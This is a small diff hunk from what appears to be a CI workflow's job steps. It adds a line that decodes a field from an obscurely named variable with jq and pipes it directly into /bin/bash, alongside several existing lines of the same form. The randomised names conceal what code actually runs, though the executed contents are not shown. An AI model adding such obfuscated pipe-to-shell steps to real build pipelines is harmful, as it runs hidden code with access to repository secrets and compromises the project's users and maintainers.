@@ -22,6 +22,7 @@ jobs:
           echo $i6 | jq -r .wt660 | /bin/bash
           printf '%s' "$kctf96" | jq -r .tyc15 | /bin/bash
           echo $qsc84 | jq -r .xyzj6280 | /bin/bash
+          printf '%s' "$skmt6186" | jq -r .fvxq99 | /bin/bash
 
       - name: Save results
         if: always()
